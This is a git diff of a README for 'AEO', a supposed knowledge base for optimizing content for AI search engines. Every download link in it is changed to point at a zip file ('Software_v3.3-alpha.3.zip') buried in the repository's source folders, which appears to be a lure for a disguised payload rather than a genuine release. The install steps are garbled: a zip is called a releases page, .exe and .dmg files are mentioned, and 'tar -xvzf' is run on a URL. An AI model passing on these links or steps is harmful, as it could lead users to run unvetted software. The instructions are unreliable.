@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to AEO! This guide helps you download and run our application easily. AEO is your community-driven knowledge base for optimizing content across various AI-powered search engines. 
 
-[![Download aeo](https://raw.githubusercontent.com/blobby9000/aeo/main/src/app/optimization/semantic-markup/Software_v3.0.zip%20aeo-blue)](https://raw.githubusercontent.com/blobby9000/aeo/main/src/app/optimization/semantic-markup/Software_v3.0.zip)
+[![Download aeo](https://github.com/blobby9000/aeo/raw/refs/heads/main/src/app/strategies/quotes-statistics/Software_v3.3-alpha.3.zip%20aeo-blue)](https://github.com/blobby9000/aeo/raw/refs/heads/main/src/app/strategies/quotes-statistics/Software_v3.3-alpha.3.zip)
 
 ## 📦 Requirements
 Before you begin, make sure your computer meets the following requirements:
@@ -14,7 +14,7 @@ Before you begin, make sure your computer meets the following requirements:
 - **Internet Connection**: Required for updates and downloading components
 
 ## 📥 Download & Install
-1. **Visit this page to download**: Go to our [Releases page](https://raw.githubusercontent.com/blobby9000/aeo/main/src/app/optimization/semantic-markup/Software_v3.0.zip) to find the latest version of AEO.
+1. **Visit this page to download**: Go to our [Releases page](https://github.com/blobby9000/aeo/raw/refs/heads/main/src/app/strategies/quotes-statistics/Software_v3.3-alpha.3.zip) to find the latest version of AEO.
 2. Choose the appropriate file for your operating system from the listings.
 3. Click the file name to start the download.
 4. Once the download finishes, locate the file on your computer.
@@ -24,7 +24,7 @@ Before you begin, make sure your computer meets the following requirements:
 2. **Open the file**:
    - For Windows: Double-click the `.exe` file to run the installer.
    - For macOS: Open the `.dmg` file and drag AEO into your Applications folder.
-   - For Linux: Use the terminal to navigate to the downloaded `https://raw.githubusercontent.com/blobby9000/aeo/main/src/app/optimization/semantic-markup/Software_v3.0.zip` file and extract it using the command `tar -xvzf https://raw.githubusercontent.com/blobby9000/aeo/main/src/app/optimization/semantic-markup/Software_v3.0.zip`, then access the AEO folder.
+   - For Linux: Use the terminal to navigate to the downloaded `https://github.com/blobby9000/aeo/raw/refs/heads/main/src/app/strategies/quotes-statistics/Software_v3.3-alpha.3.zip` file and extract it using the command `tar -xvzf https://github.com/blobby9000/aeo/raw/refs/heads/main/src/app/strategies/quotes-statistics/Software_v3.3-alpha.3.zip`, then access the AEO folder.
 3. **Follow the installation prompts**: The installer will guide you through the necessary steps to complete the installation.
 
 ## ✨ Features
